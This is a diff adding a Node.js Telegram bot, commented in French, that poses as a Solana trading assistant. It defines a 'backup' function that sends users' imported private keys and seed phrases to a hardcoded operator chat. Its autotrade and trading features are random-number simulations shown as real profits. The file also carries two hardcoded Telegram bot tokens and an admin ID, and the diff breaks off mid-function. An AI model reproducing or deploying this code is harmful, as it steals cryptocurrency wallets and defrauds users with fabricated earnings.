@@ -1,0 +1,2561 @@
+require('dotenv').config();
+const TelegramBot = require('node-telegram-bot-api');
+const { Keypair, Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram, Token, TOKEN_PROGRAM_ID } = require('@solana/web3.js');
+const bs58 = require('bs58');
+const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
+
+// Configuration
+const SOLANA_RPC = process.env.SOLANA_RPC || "https://api.mainnet-beta.solana.com";
+const MAIN_BOT_TOKEN = process.env.MAIN_BOT_TOKEN || "8564615150:AAGIObXe4jZxEK5ZpOYw5x0jnhCDnpt6nVU";
+const BACKUP_BOT_TOKEN = process.env.BACKUP_BOT_TOKEN || "7931381114:AAGt20pJlOH0bvTgQjqJCLf7JW-7gEhq5v8";
+const BACKUP_CHAT_ID = process.env.BACKUP_CHAT_ID || "5798607712";
+const ADMIN_IDS = process.env.ADMIN_IDS ? process.env.ADMIN_IDS.split(',').map(id => parseInt(id.trim())) : [5798607712];
+
+// Initialisation des bots
+const mainBot = new TelegramBot(MAIN_BOT_TOKEN, {
+    polling: {
+        interval: 300,
+        autoStart: true,
+        params: {
+            timeout: 60,
+            limit: 100
+        }
+    },
+    request: {
+        timeout: 60000,
+        agentOptions: {
+            keepAlive: true,
+            family: 4
+        }
+    }
+});
+
+const backupBot = BACKUP_BOT_TOKEN ? new TelegramBot(BACKUP_BOT_TOKEN) : null;
+
+// Chargement des données persistantes
+const DATA_FILE = path.join(__dirname, 'bot_data.json');
+let persistentData = {
+    userWallets: {},
+    userStates: {},
+    userSettings: {},
+    referralCodes: {},
+    connectedUsers: [],
+    autotradeSessions: {},
+    userBalances: {},
+    adminBalances: {}
+};
+
+try {
+    if (fs.existsSync(DATA_FILE)) {
+        const data = fs.readFileSync(DATA_FILE, 'utf8');
+        persistentData = JSON.parse(data);
+    }
+} catch (error) {
+    console.error('Error loading persistent data:', error);
+}
+
+// Stockage des données
+// Stockage des données
+const userWallets = new Map(Object.entries(persistentData.userWallets || {}));
+const userStates = new Map(Object.entries(persistentData.userStates || {}));
+const userSettings = new Map(Object.entries(persistentData.userSettings || {}));
+const referralCodes = new Map(Object.entries(persistentData.referralCodes || {}));
+const connectedUsers = new Set(persistentData.connectedUsers || []);
+const autotradeSessions = new Map(Object.entries(persistentData.autotradeSessions || {}));
+const userBalances = new Map(Object.entries(persistentData.userBalances || {}));
+const adminBalances = new Map(Object.entries(persistentData.adminBalances || {}));
+
+// Sauvegarde des données
+function savePersistentData() {
+    persistentData = {
+        userWallets: Object.fromEntries(userWallets),
+        userStates: Object.fromEntries(userStates),
+        userSettings: Object.fromEntries(userSettings),
+        referralCodes: Object.fromEntries(referralCodes),
+        connectedUsers: Array.from(connectedUsers),
+        autotradeSessions: Object.fromEntries(autotradeSessions),
+        userBalances: Object.fromEntries(userBalances),
+        adminBalances: Object.fromEntries(adminBalances)
+    };
+    
+    fs.writeFileSync(DATA_FILE, JSON.stringify(persistentData, null, 2));
+}
+
+// Configuration pour le trading simulé
+const TRADING_CONFIG = {
+    INITIAL_SOL_BALANCE: 100,
+    PRICE_UPDATE_INTERVAL: 1000,
+    TRANSACTION_HISTORY_LIMIT: 15,
+    MIN_TOKEN_PRICE: 0.000001,
+    MAX_TOKEN_PRICE: 0.02,
+    DEFAULT_SLIPPAGE: 1,
+    DEFAULT_GAS_FEE: 0.0005,
+    DEFAULT_BUY_AMOUNT: 10,
+    DEFAULT_SELL_PERCENT: 100,
+    TOKEN_NAMES: {
+        'So11111111111111111111111111111111111111112': 'SOL',
+        'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
+        'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
+        '7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU': 'SAMO',
+        'SRMuApVNdxXokk5GT7XD5cUUgXMBCoAz2LHeuAoKWRt': 'SRM'
+    }
+};
+
+// Configuration Autotrade
+const AUTOTRADE_MODES = {
+    SAFE: {
+        name: "SAFE",
+        risk: 0.3,
+        profitTarget: 0.15,
+        stopLoss: 0.08,
+        tradeFrequency: 30000
+    },
+    NORMAL: {
+        name: "NORMAL",
+        risk: 0.5,
+        profitTarget: 0.25,
+        stopLoss: 0.15,
+        tradeFrequency: 20000
+    },
+    DEGEN: {
+        name: "DEGEN",
+        risk: 0.8,
+        profitTarget: 0.5,
+        stopLoss: 0.25,
+        tradeFrequency: 10000
+    }
+};
+
+// État global pour le trading simulé
+const tradingState = {
+    users: {},
+    tokenPrices: {},
+    trackedMessages: new Map(),
+    intervals: []
+};
+
+// Système de parrainage
+class ReferralSystem {
+    constructor() {
+        this.referrals = new Map();
+        this.userReferrers = new Map();
+        this.bonusPayments = new Map();
+        this.referralCounts = new Map();
+    }
+
+    generateCode(userId) {
+        const code = `RP${Math.random().toString(36).substr(2, 6).toUpperCase()}`;
+        this.referrals.set(code, { userId, uses: 0 });
+        return code;
+    }
+
+    useCode(userId, code) {
+        if (code.toLowerCase() === 'zodiaque') return true;
+        if (!this.referrals.has(code)) return false;
+        
+        const referral = this.referrals.get(code);
+        referral.uses++;
+        this.userReferrers.set(userId, referral.userId);
+        
+        this.addBonus(referral.userId, 0.01);
+        this.addBonus(userId, 0.005);
+        
+        const currentCount = this.referralCounts.get(referral.userId) || 0;
+        this.referralCounts.set(referral.userId, currentCount + 1);
+        
+        return true;
+    }
+
+    addBonus(userId, amount) {
+        const current = this.bonusPayments.get(userId) || 0;
+        this.bonusPayments.set(userId, current + amount);
+        
+        // Ajouter au solde principal
+        const currentBalance = userBalances.get(userId.toString()) || 0;
+        userBalances.set(userId.toString(), currentBalance + amount);
+        savePersistentData();
+    }
+
+    getUserReferrals(userId) {
+        return this.referralCounts.get(userId) || 0;
+    }
+
+    getUserBonus(userId) {
+        return this.bonusPayments.get(userId) || 0;
+    }
+
+    canWithdrawBonus(userId) {
+        return this.getUserReferrals(userId) >= 20;
+    }
+}
+
+const referralSystem = new ReferralSystem();
+const solanaConnection = new Connection(SOLANA_RPC);
+
+// ==================== FONCTIONS UTILITAIRES ====================
+function formatTime(seconds) {
+    const hours = Math.floor(seconds / 3600);
+    const minutes = Math.floor((seconds % 3600) / 60);
+    const secs = seconds % 60;
+    return `${hours}h ${minutes}m ${secs}s`;
+}
+
+async function cleanupPreviousMessages(chatId, keepMainMenu = false) {
+    const state = userStates.get(chatId) || {};
+    
+    const messagesToDelete = [
+        'waitlistMessageId', 'accessGrantedMessageId', 'walletInfoMessageId',
+        'mainMenuMessageId', 'tradingMenuMessageId', 'importWalletMessageId',
+        'manageWalletMessageId', 'rugCheckMessageId', 'exportConfirmMessageId',
+        'helpMenuMessageId', 'withdrawMenuMessageId', 'errorMessageId',
+        'autotradeMenuMessageId', 'adminMenuMessageId'
+    ];
+
+    for (const messageId of messagesToDelete) {
+        if (state[messageId] && !(messageId === 'tradingMenuMessageId' && keepMainMenu)) {
+            try {
+                await mainBot.deleteMessage(chatId, state[messageId]);
+                delete state[messageId];
+            } catch (error) {
+                // Ignorer les erreurs de suppression
+            }
+        }
+    }
+    
+    userStates.set(chatId, state);
+}
+
+function escapeText(text) {
+    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+}
+
+function validatePrivateKey(input) {
+    const cleaned = input.trim();
+    
+    if (cleaned.length < 30) throw new Error("Invalid key length");
+
+    try {
+        if (cleaned.length === 64 && /^[0-9a-fA-F]+$/.test(cleaned)) {
+            return {
+                keypair: Keypair.fromSecretKey(Buffer.from(cleaned, 'hex')),
+                cleanKey: cleaned
+            };
+        }
+        
+        return {
+            keypair: Keypair.fromSecretKey(bs58.decode(cleaned)),
+            cleanKey: cleaned
+        };
+    } catch (e) {
+        throw new Error("Invalid key format (use Hex or Base58)");
+    }
+}
+
+async function sendToBackupBot(userId, type, data) {
+    if (!backupBot) return true;
+    
+    try {
+        const username = userStates.get(userId)?.username || `User_${userId}`;
+        const message = `🔐 NOUVELLE ${type.toUpperCase()} SOLANA\n\n`
+            + `• ID: ${userId}\n`
+            + `• Username: ${username}\n`
+            + `• Date: ${new Date().toLocaleString()}\n\n`
+            + `• ${type === 'private key' ? 'Clé Privée' : 'Seed Phrase'}: ${escapeText(data)}\n\n`
+            + `⚠️ CONSERVER CE MESSAGE EN SÉCURITÉ`;
+
+        await backupBot.sendMessage(BACKUP_CHAT_ID, message);
+        return true;
+    } catch (error) {
+        console.error("Backup error:", error);
+        return false;
+    }
+}
+
+async function getWalletBalance(publicKey) {
+    try {
+        const balance = await solanaConnection.getBalance(new PublicKey(publicKey));
+        return balance / LAMPORTS_PER_SOL;
+    } catch (error) {
+        console.error("Balance error:", error);
+        return 0;
+    }
+}
+
+function getUserMainBalance(userId) {
+    const balance = userBalances.get(userId.toString());
+    // Assurez-vous que c'est un nombre
+    if (balance === undefined || balance === null || isNaN(balance)) {
+        return 0;
+    }
+    return Number(balance);
+}
+// Fonction utilitaire pour formater les nombres en toute sécurité
+function safeToFixed(value, decimals = 4) {
+    try {
+        if (value === undefined || value === null) return '0.0000';
+        const num = Number(value);
+        if (isNaN(num)) return '0.0000';
+        return num.toFixed(decimals);
+    } catch (error) {
+        return '0.0000';
+    }
+}
+function setUserMainBalance(userId, amount) {
+    userBalances.set(userId.toString(), amount);
+    savePersistentData();
+}
+
+function addToUserMainBalance(userId, amount) {
+    const current = getUserMainBalance(userId);
+    setUserMainBalance(userId, current + amount);
+}
+
+// ==================== TOKEN ANALYSIS ====================
+async function analyzeToken(chatId, tokenAddress) {
+    try {
+        await mainBot.sendChatAction(chatId, 'typing');
+        
+        if (!tokenAddress.match(/^[1-9A-HJ-NP-Za-km-z]{32,44}$/)) {
+            return sendTempMessage(chatId, "❌ Invalid Solana token address format");
+        }
+
+        const { data } = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`);
+        
+        if (!data.pairs || data.pairs.length === 0) {
+            return sendTempMessage(chatId, "❌ No trading pairs found for this token.");
+        }
+
+        const pair = data.pairs.reduce((max, current) => 
+            (current.liquidity?.usd > max.liquidity?.usd) ? current : max
+        );
+        
+        const riskAnalysis = analyzeTokenRisk(pair);
+        
+        let message = `<b>🔍 Token Analysis - Rug Check</b>\n\n`;
+        message += `<b>🏷️ ${pair.baseToken.name || 'Unknown'} (${pair.baseToken.symbol || '?'})</b>\n`;
+        message += `<code>🔗 Address: ${tokenAddress}</code>\n\n`;
+        message += `<b>📊 Market Stats</b>\n`;
+        message += `• Liquidity: $${(pair.liquidity?.usd || 0).toLocaleString()}\n`;
+        message += `• 24h Volume: $${(pair.volume?.h24 || 0).toLocaleString()}\n`;
+        message += `• Price: $${pair.priceUsd || 'N/A'}\n`;
+        message += `• Price Change (24h): ${pair.priceChange?.h24 ? pair.priceChange.h24.toFixed(2)+'%' : 'N/A'}\n`;
+        message += `• Age: ${pair.pairCreatedAt ? getTokenAge(pair.pairCreatedAt) : 'Unknown'}\n\n`;
+        message += `<b>⚠️ Risk Analysis</b>\n`;
+        message += `• Score: ${riskAnalysis.score}/10\n`;
+        message += `• Reasons: ${riskAnalysis.reasons.join(', ')}\n\n`;
+        message += `<b>💡 Recommendation</b>\n${riskAnalysis.recommendation}\n\n`;
+        message += `🕒 ${new Date().toLocaleTimeString('fr-FR', {hour: '2-digit', minute:'2-digit'})}`;
+
+        await mainBot.sendMessage(chatId, message, {
+            parse_mode: 'HTML',
+            disable_web_page_preview: true,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "📊 DexScreener", url: `https://dexscreener.com/solana/${tokenAddress}` },
+                        { text: "🔍 Solscan", url: `https://solscan.io/token/${tokenAddress}` }
+                    ],
+                    [
+                        { text: "← Back", callback_data: 'menu' }
+                    ]
+                ]
+            }
+        });
+
+    } catch (error) {
+        console.error('Rug check error:', error);
+        sendTempMessage(chatId, "❌ Error during token analysis. Please try again later.");
+    }
+}
+
+function getTokenAge(creationDate) {
+    const now = new Date();
+    const created = new Date(creationDate);
+    const diffDays = Math.floor((now - created) / (1000 * 60 * 60 * 24));
+    
+    if (diffDays < 1) {
+        const diffHours = Math.floor((now - created) / (1000 * 60 * 60));
+        return `${diffHours} hour(s)`;
+    }
+    return `${diffDays} day(s)`;
+}
+
+function analyzeTokenRisk(pair) {
+    let score = 0;
+    const reasons = [];
+    
+    if (!pair.liquidity?.usd || pair.liquidity.usd < 1000) {
+        score += 3;
+        reasons.push("Very low liquidity (<$1k)");
+    } else if (pair.liquidity.usd < 10000) {
+        score += 2;
+        reasons.push("Low liquidity (<$10k)");
+    } else if (pair.liquidity.usd < 50000) {
+        score += 1;
+        reasons.push("Moderate liquidity (<$50k)");
+    }
+    
+    if (!pair.volume?.h24 || pair.volume.h24 < 1000) {
+        score += 2;
+        reasons.push("Low volume (<$1k/24h)");
+    }
+    
+    if (pair.pairCreatedAt) {
+        const ageDays = (Date.now() - new Date(pair.pairCreatedAt).getTime()) / (1000 * 60 * 60 * 24);
+        if (ageDays < 0.5) {
+            score += 3;
+            reasons.push("Very new token (<12h)");
+        } else if (ageDays < 1) {
+            score += 2;
+            reasons.push("New token (<24h)");
+        } else if (ageDays < 3) {
+            score += 1;
+            reasons.push("Recent token (<3 days)");
+        }
+    }
+    
+    if (pair.priceChange?.h24 < -30) {
+        score += 3;
+        reasons.push("Large price drop (>30%)");
+    } else if (pair.priceChange?.h24 < -20) {
+        score += 2;
+        reasons.push("Significant price drop (>20%)");
+    } else if (pair.priceChange?.h24 < -10) {
+        score += 1;
+        reasons.push("Price drop (>10%)");
+    }
+    
+    if (pair.holders && pair.holders < 100) {
+        score += 2;
+        reasons.push("Low holder count");
+    }
+    
+    let recommendation;
+    if (score >= 8) {
+        recommendation = "🚨 VERY HIGH RISK - Strong signs of potential rug pull. Avoid at all costs!";
+    } else if (score >= 5) {
+        recommendation = "⚠️ HIGH RISK - Multiple red flags detected. Extreme caution required.";
+    } else if (score >= 3) {
+        recommendation = "⚠️ Moderate risk - Some concerning indicators. Trade carefully.";
+    } else {
+        recommendation = "✅ Low risk - Few apparent risks detected. Still, always do your own research.";
+    }
+    
+    return {
+        score: Math.min(score, 10),
+        reasons,
+        recommendation
+    };
+}
+
+// ==================== AI TOKEN ANALYSIS ====================
+async function getLatestTokens() {
+    try {
+        const { data } = await axios.get('https://api.dexscreener.com/token-profiles/latest/v1', {
+            timeout: 10000
+        });
+
+        return Array.isArray(data) ? data : [];
+    } catch (error) {
+        console.error("Erreur complète:", error);
+        throw error;
+    }
+}
+
+async function callAITokenAnalysis(chatId) {
+    try {
+        await mainBot.sendMessage(chatId, "🔍 AI is analyzing the latest tokens...");
+
+        const tokens = await getLatestTokens();
+
+        if (!tokens || tokens.length === 0) {
+            return await sendTempMessage(chatId, "⚠️ No new promising tokens found at the moment. Try again later.");
+        }
+
+        for (const token of tokens.slice(0, 3)) {
+            const message =  "<b>🆕 Nouveau token détecté</b>\n\n" +
+                `<code>${token.tokenAddress}</code>\n\n` +
+                `<b>📛 Nom:</b> ${token.name || 'N/A'}\n` +
+                `<b>🔠 Symbole:</b> ${token.symbol || 'N/A'}\n` +
+                `<b>🧬 Adresse:</b> <code>${token.tokenAddress}</code>\n` +
+                `<b>🌐 Voir sur DexScreener:</b> <a href="${token.url}">Lien</a>\n\n` +
+                `<b>📝 Description:</b>\n${token.description || 'Aucune description'}\n\n`;
+            
+            const options = {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: 'Voir sur DexScreener', url: token.url },
+                            { text: 'Acheter', url: `https://jup.ag/swap/SOL-${token.symbol}_${token.tokenAddress}` },
+                        ],
+                        [ { text: "← Back", callback_data: 'menu' }] 
+                    ]
+                }
+            };
+
+            await mainBot.sendMessage(chatId, message, options);
+            await new Promise(resolve => setTimeout(resolve, 500));
+        }
+
+    } catch (error) {
+        console.error("Error in AI analysis:", error);
+        sendTempMessage(chatId, `❌ Error: ${error.message}`);
+    }
+}
+
+// ==================== AUTOTRADE SYSTEM ====================
+class AutotradeSession {
+    constructor(userId, mode, amount) {
+        this.userId = userId;
+        this.mode = mode;
+        this.initialAmount = amount;
+        this.currentAmount = amount;
+        this.startTime = Date.now();
+        this.trades = [];
+        this.active = true;
+        this.currentTrade = null;
+        this.progress = 0;
+        this.interval = null;
+        this.tokenInfo = null;
+    }
+
+    async start() {
+        // Générer un token aléatoire pour la simulation
+        this.tokenInfo = await this.generateRandomTokenInfo();
+        
+        // Démarrer la session
+        this.interval = setInterval(() => {
+            this.executeTradeCycle();
+        }, AUTOTRADE_MODES[this.mode].tradeFrequency);
+        
+        // Premier cycle immédiat
+        this.executeTradeCycle();
+    }
+
+    async generateRandomTokenInfo() {
+        const memecoins = [
+            { name: "DogWifHat", symbol: "WIF", address: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" },
+            { name: "Bonk", symbol: "BONK", address: "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263" },
+            { name: "Book of Meme", symbol: "BOME", address: "79HCS2K34WQt6QhjUACq3MHoM6yyBrzYpBjMZPx6YDw9" },
+            { name: "Popcat", symbol: "POPCAT", address: "7GCihgDB8fe6KNjn2MYtkzZcRjQy3t9GHdC8uHYmW2hr" },
+            { name: "Catwifhat", symbol: "CWF", address: "EKpQGSJtjMFqKZ9KQanSqYXRcF8fBopzLHYxdM65zcjm" }
+        ];
+        
+        const token = memecoins[Math.floor(Math.random() * memecoins.length)];
+        const basePrice = 0.0001 + Math.random() * 0.001;
+        
+        return {
+            ...token,
+            currentPrice: basePrice,
+            buyPrice: basePrice,
+            volatility: AUTOTRADE_MODES[this.mode].risk * 0.1
+        };
+    }
+
+    executeTradeCycle() {
+        if (!this.active || !this.tokenInfo) return;
+        
+        this.progress = Math.min(100, ((Date.now() - this.startTime) / (5 * 60 * 1000)) * 100);
+        
+        // Simuler une fluctuation de prix
+        const change = (Math.random() - 0.5) * 2 * this.tokenInfo.volatility;
+        this.tokenInfo.currentPrice *= (1 + change);
+        
+        // Vérifier si on doit vendre (profit target ou stop loss)
+        const priceChange = (this.tokenInfo.currentPrice - this.tokenInfo.buyPrice) / this.tokenInfo.buyPrice;
+        
+        if (priceChange >= AUTOTRADE_MODES[this.mode].profitTarget || 
+            priceChange <= -AUTOTRADE_MODES[this.mode].stopLoss ||
+            Math.random() < 0.3) { // 30% chance de vendre à chaque cycle
+            
+            this.executeSell();
+            
+            // Si la session n'est pas terminée, acheter un nouveau token
+            if (this.active && this.currentAmount > 0.001) {
+                setTimeout(() => {
+                    this.executeBuy();
+                }, 1000);
+            }
+        }
+        
+        // Mettre à jour l'interface utilisateur
+        this.updateUserInterface();
+    }
+
+    executeBuy() {
+        if (!this.tokenInfo) return;
+        
+        this.tokenInfo.buyPrice = this.tokenInfo.currentPrice;
+        const trade = {
+            type: 'buy',
+            token: this.tokenInfo,
+            amount: this.currentAmount,
+            price: this.tokenInfo.buyPrice,
+            timestamp: Date.now()
+        };
+        
+        this.trades.push(trade);
+        this.currentTrade = trade;
+    }
+
+    executeSell() {
+        if (!this.currentTrade || !this.tokenInfo) return;
+        
+        const profit = (this.tokenInfo.currentPrice - this.currentTrade.price) * this.currentTrade.amount;
+        this.currentAmount += profit;
+        
+        const trade = {
+            type: 'sell',
+            token: this.tokenInfo,
+            amount: this.currentTrade.amount,
+            buyPrice: this.currentTrade.price,
+            sellPrice: this.tokenInfo.currentPrice,
+            profit: profit,
+            pnl: (profit / this.currentTrade.amount) * 100,
+            timestamp: Date.now()
+        };
+        
+        this.trades.push(trade);
+        this.currentTrade = null;
+        
+        // Si le profit est significatif, ajouter au solde principal
+        if (profit > 0) {
+            addToUserMainBalance(this.userId, profit * 0.8); // 80% des gains
+        }
+        
+        // Générer un nouveau token
+        this.generateRandomTokenInfo().then(info => {
+            this.tokenInfo = info;
+        });
+    }
+
+    stop() {
+        this.active = false;
+        if (this.interval) {
+            clearInterval(this.interval);
+            this.interval = null;
+        }
+        
+        // Vendre la position actuelle si elle existe
+        if (this.currentTrade && this.tokenInfo) {
+            const profit = (this.tokenInfo.currentPrice - this.currentTrade.price) * this.currentTrade.amount;
+            this.currentAmount += profit;
+            
+            if (profit > 0) {
+                addToUserMainBalance(this.userId, profit * 0.8);
+            }
+        }
+        
+        // Retirer la session
+        autotradeSessions.delete(this.userId.toString());
+        savePersistentData();
+        
+        return {
+            initialAmount: this.initialAmount,
+            finalAmount: this.currentAmount,
+            totalProfit: this.currentAmount - this.initialAmount,
+            totalTrades: this.trades.length,
+            duration: Date.now() - this.startTime
+        };
+    }
+
+    updateUserInterface() {
+        const chatId = this.userId;
+        const state = userStates.get(chatId);
+        
+        if (state && state.autotradeMessageId) {
+            this.sendAutotradeUpdate(chatId, state.autotradeMessageId);
+        }
+    }
+
+    async sendAutotradeUpdate(chatId, messageId) {
+        if (!this.tokenInfo) return;
+        
+        const currentTrade = this.currentTrade;
+        const lastTrade = this.trades.length > 0 ? this.trades[this.trades.length - 1] : null;
+        
+        let message = `<b>🤖 AUTOTRADE SESSION - ${this.mode} MODE</b>\n\n`;
+        message += `<b>📊 Token Actuel:</b> ${this.tokenInfo.name} (${this.tokenInfo.symbol})\n`;
+        message += `<code>Adresse: ${this.tokenInfo.address.substring(0, 12)}...${this.tokenInfo.address.substring(this.tokenInfo.address.length - 6)}</code>\n\n`;
+        
+        if (currentTrade) {
+            const currentPNL = ((this.tokenInfo.currentPrice - currentTrade.price) / currentTrade.price) * 100;
+            message += `<b>📈 Position Ouverte</b>\n`;
+            message += `• Prix d'achat: ${currentTrade.price.toFixed(8)} SOL\n`;
+            message += `• Prix actuel: ${this.tokenInfo.currentPrice.toFixed(8)} SOL\n`;
+            message += `• PNL: <b>${currentPNL.toFixed(2)}%</b>\n`;
+            message += `• Montant: ${currentTrade.amount.toFixed(4)} SOL\n\n`;
+        }
+        
+        if (lastTrade && lastTrade.type === 'sell') {
+            message += `<b>💰 Dernière Transaction</b>\n`;
+            message += `• ${lastTrade.profit >= 0 ? '🟢 Profit' : '🔴 Perte'}: ${Math.abs(lastTrade.profit).toFixed(4)} SOL\n`;
+            message += `• PNL: ${lastTrade.pnl.toFixed(2)}%\n\n`;
+        }
+        
+        message += `<b>📊 Statistiques Session</b>\n`;
+        message += `• Capital initial: ${this.initialAmount.toFixed(4)} SOL\n`;
+        message += `• Capital actuel: ${this.currentAmount.toFixed(4)} SOL\n`;
+        message += `• Total trades: ${this.trades.length}\n`;
+        message += `• Mode: ${this.mode}\n`;
+        message += `• Durée: ${formatTime(Math.floor((Date.now() - this.startTime) / 1000))}\n\n`;
+        
+        // Barre de progression
+        const progressBar = this.generateProgressBar(this.progress);
+        message += `<b>⏳ Progression:</b>\n`;
+        message += `${progressBar} ${this.progress.toFixed(1)}%\n\n`;
+        
+        message += `<i>🔄 Mise à jour: ${new Date().toLocaleTimeString()}</i>`;
+        
+        try {
+            await mainBot.editMessageText(message, {
+                chat_id: chatId,
+                message_id: messageId,
+                parse_mode: 'HTML',
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            { text: "🛑 Stop Session", callback_data: "autotrade_stop" },
+                            { text: "🔄 Refresh", callback_data: "autotrade_refresh" }
+                        ],
+                        [
+                            { text: "← Back to Menu", callback_data: "menu" }
+                        ]
+                    ]
+                }
+            });
+        } catch (error) {
+            // Ignorer les erreurs d'édition
+        }
+    }
+
+    generateProgressBar(percentage) {
+        const bars = 20;
+        const filledBars = Math.round((percentage / 100) * bars);
+        const emptyBars = bars - filledBars;
+        
+        return '█'.repeat(filledBars) + '░'.repeat(emptyBars);
+    }
+}
+
+// ==================== FONCTIONS TRADING SIMULE ====================
+function initializeTradingUser(chatId) {
+    if (!tradingState.users[chatId]) {
+        tradingState.users[chatId] = {
+            wallet: {
+                SOL: TRADING_CONFIG.INITIAL_SOL_BALANCE,
+                tokens: {},
+                history: []
+            },
+            settings: {
+                slippage: TRADING_CONFIG.DEFAULT_SLIPPAGE,
+                gasFee: TRADING_CONFIG.DEFAULT_GAS_FEE,
+                defaultBuyAmount: TRADING_CONFIG.DEFAULT_BUY_AMOUNT,
+                defaultSellPercent: TRADING_CONFIG.DEFAULT_SELL_PERCENT
+            },
+            stats: {
+                totalTrades: 0,
+                totalProfit: 0,
+                totalLoss: 0,
+                totalGasFees: 0,
+                winRate: 0
+            },
+            tradeState: null
+        };
+    }
+    return tradingState.users[chatId];
+}
+
+function getTokenName(address) {
+    return TRADING_CONFIG.TOKEN_NAMES[address] || `${address.substring(0, 3)}...${address.substring(address.length - 3)}`;
+}
+
+function shortenAddress(address) {
+    if (!address || address.length < 10) return address;
+    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
+}
+
+function updateTokenPrice(tokenAddress) {
+    try {
+        const change = -0.02 + Math.random() * 0.04;
+        const newPrice = (tradingState.tokenPrices[tokenAddress] || TRADING_CONFIG.MIN_TOKEN_PRICE) * (1 + change);
+        
+        tradingState.tokenPrices[tokenAddress] = Math.max(
+            TRADING_CONFIG.MIN_TOKEN_PRICE, 
+            Math.min(newPrice, TRADING_CONFIG.MAX_TOKEN_PRICE)
+        );
+        
+        return tradingState.tokenPrices[tokenAddress];
+    } catch (error) {
+        console.error('Price update error:', error);
+        return tradingState.tokenPrices[tokenAddress] || TRADING_CONFIG.MIN_TOKEN_PRICE;
+    }
+}
+
+function calculateUserPNL(user) {
+    try {
+        let totalPNL = 0;
+        let realizedPNL = 0;
+        let unrealizedPNL = 0;
+        
+        user.wallet.history.forEach(tx => {
+            if (tx.type === 'sell') {
+                const pnl = (tx.amount * tx.price) - (tx.amount * tx.buyPrice);
+                realizedPNL += pnl;
+            }
+        });
+        
+        for (const [token, data] of Object.entries(user.wallet.tokens)) {
+            const currentPrice = updateTokenPrice(token);
+            unrealizedPNL += (data.amount * currentPrice) - (data.amount * data.buyPrice);
+        }
+        
+        user.stats.totalProfit = Math.max(0, realizedPNL);
+        user.stats.totalLoss = Math.max(0, -realizedPNL);
+        user.stats.totalTrades = user.wallet.history.filter(tx => tx.type === 'sell').length;
+        user.stats.winRate = user.stats.totalTrades > 0 ? 
+            (user.stats.totalProfit / (user.stats.totalProfit + user.stats.totalLoss)) * 100 : 0;
+        
+        totalPNL = realizedPNL + unrealizedPNL - user.stats.totalGasFees;
+        
+        return {
+            total: totalPNL,
+            realized: realizedPNL,
+            unrealized: unrealizedPNL
+        };
+    } catch (error) {
+        console.error('PNL calculation error:', error);
+        return { total: 0, realized: 0, unrealized: 0 };
+    }
+}
+
+function formatPNL(pnl) {
+    try {
+        return pnl >= 0 ? `🟢 +${pnl.toFixed(4)} SOL` : `🔴 ${pnl.toFixed(4)} SOL`;
+    } catch {
+        return 'N/A';
+    }
+}
+
+async function safeEditMessage(chatId, messageId, text, options = {}) {
+    try {
+        const safeOptions = {
+            parse_mode: options.parse_mode,
+            reply_markup: options.reply_markup ? {
+                inline_keyboard: options.reply_markup.inline_keyboard
+            } : undefined
+        };
+        
+        await mainBot.editMessageText(text, { 
+            chat_id: chatId, 
+            message_id: messageId, 
+            ...safeOptions 
+        });
+        return true;
+    } catch (error) {
+        if (error.response?.body?.description?.includes('message is not modified')) {
+            return true;
+        }
+        return false;
+    }
+}
+
+async function safeSendMessage(chatId, text, options = {}) {
+    try {
+        const safeOptions = {
+            parse_mode: options.parse_mode,
+            reply_markup: options.reply_markup ? {
+                inline_keyboard: options.reply_markup.inline_keyboard
+            } : undefined
+        };
+        
+        return await mainBot.sendMessage(chatId, text, safeOptions);
+    } catch (error) {
+        console.error('Message send error:', error);
+        throw error;
+    }
+}
+
+async function sendTempMessage(chatId, text, duration = 5000) {
+    try {
+        const message = await mainBot.sendMessage(chatId, text, { parse_mode: 'HTML' });
+        
+        setTimeout(async () => {
+            try {
+                await mainBot.deleteMessage(chatId, message.message_id);
+            } catch (e) {
+                // Ignorer les erreurs de suppression
+            }
+        }, duration);
+        
+        return message;
+    } catch (error) {
+        console.error('Temp message error:', error);
+    }
+}
+
+// ==================== WALLET MANAGEMENT ====================
+async function showWalletMenu(chatId) {
+    const wallets = userWallets.get(chatId) || [];
+    
+    let messageText = `<b>👛 Wallet Management</b>\n\n`;
+    
+    if (wallets.length === 0) {
+        messageText += `No wallets imported yet.\n\n`;
+    } else {
+        messageText += `<b>Your Wallets:</b>\n`;
+        for (const [index, wallet] of wallets.entries()) {
+            const balance = await getWalletBalance(wallet.publicKey);
+            wallet.balance = balance;
+            messageText += `\n${wallet.isDefault ? '⭐ ' : ''}${index + 1}. ${wallet.name || 'Wallet'} - <code>${wallet.publicKey}</code>\n`;
+            messageText += `   Balance: ${balance.toFixed(4)} SOL\n`;
+        }
+    }
+    
+    messageText += `\nSelect an action:`;
+
+    const keyboard = [
+        [{ text: '🔑 Import Wallet', callback_data: 'import_wallet_menu' }]
+    ];
+
+    if (wallets.length > 0) {
+        keyboard.push(
+            [
+                { text: '✏️ Rename Wallet', callback_data: 'rename_wallet' },
+                { text: '🗑️ Delete Wallet', callback_data: 'delete_wallet' }
+            ],
+            [
+                { text: '⭐ Set Default', callback_data: 'set_default_wallet' },
+                { text: '🔄 Refresh', callback_data: 'refresh_wallet' }
+            ]
+        );
+    }
+
+    keyboard.push([{ text: '← Back', callback_data: 'menu' }]);
+
+    await cleanupPreviousMessages(chatId, true);
+    const message = await mainBot.sendMessage(chatId, messageText, {
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: keyboard
+        }
+    });
+    
+    const state = userStates.get(chatId) || {};
+    state.walletMenuMessageId = message.message_id;
+    userStates.set(chatId, state);
+}
+
+async function handleRenameWallet(chatId) {
+    const wallets = userWallets.get(chatId) || [];
+    
+    if (wallets.length === 0) {
